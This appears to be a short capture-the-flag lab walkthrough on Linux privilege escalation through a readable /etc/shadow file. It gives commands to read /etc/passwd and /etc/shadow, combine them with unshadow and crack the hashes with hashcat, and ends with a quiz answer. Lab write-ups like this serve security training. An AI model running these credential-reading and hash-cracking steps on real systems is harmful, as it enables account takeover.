Detection

Linux VM
  
1. In command prompt type:

**ls -la /etc/shadow**

2. Note the file permissions

![[Pasted image 20240601135205.png]]

Exploitation

Linux VM

1. In command prompt type: **cat /etc/passwd**

2. Save the output to a file on your attacker machine

3. In command prompt type: **cat /etc/shadow**

4. Save the output to a file on your attacker machine


Attacker VM  

1. In command prompt type: 

```
unshadow  'PASSWORD-FILE' 'SHADOW-FILE' > unshadowed.txt
```

  
Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

  

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O`
```

![[Pasted image 20240601203012.png]]

Answer the questions below

| Question                                                | Answer     |
| ------------------------------------------------------- | ---------- |
| What were the file permissions on the /etc/shadow file? | -rw-rw-r-- |
